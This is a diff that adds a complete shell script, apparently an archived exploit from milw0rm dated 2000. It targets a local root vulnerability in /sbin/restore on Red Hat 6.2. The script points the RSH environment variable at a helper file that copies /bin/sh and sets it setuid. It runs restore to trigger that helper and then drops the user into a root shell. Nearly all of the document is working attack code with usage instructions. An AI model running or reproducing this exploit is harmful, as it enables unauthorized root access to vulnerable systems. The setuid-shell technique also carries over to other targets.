@@ -1,0 +1,41 @@
+#!/bin/sh
+#
+# /sbin/restore exploit for rh6.2
+#
+# I did not find this weakness my self, all i did was
+# writing this script (and some more) to make it 
+# automatic and easy to use.
+#
+# This exploit should work on all redhat 6.2 systems
+# with /sbin/restore not "fucked up". May work on other
+# distros too, but only tested successfully on rh6.2.
+#
+# Make sure that the $USER variable is set! If you aren't
+# sure, do a SET USER=<your-login-name> before you start
+# the exploit!
+#
+# Please do NOT remove this header from the file.
+#
+
+echo "###########################################"
+echo "#     /sbin/restore exploit for rh6.2     #"
+echo "#          this file by nawok '00         #"
+echo "###########################################"
+echo " "
+echo "==> EXPLOIT STARTED, Wait..."
+echo "#!/bin/sh" >> /home/$USER/execfile
+echo "cp /bin/sh /home/$USER/sh" >> /home/$USER/execfile
+echo "chmod 4755 /home/$USER/sh" >> /home/$USER/execfile
+chmod 755 /home/$USER/execfile
+export TAPE=restorer:restorer
+export RSH=/home/$USER/execfile
+touch /tmp/1
+/sbin/restore -t /tmp/1
+rm -f /home/$USER/execfile
+echo "==> DONE! If everything went OK we will now enter rootshell..."
+echo "==> To check if its rooted, type 'whoami', or 'id'" 
+echo "==> B-Bye, you are on your own now."
+/home/$USER/sh
+
+
+# milw0rm.com [2000-11-16]
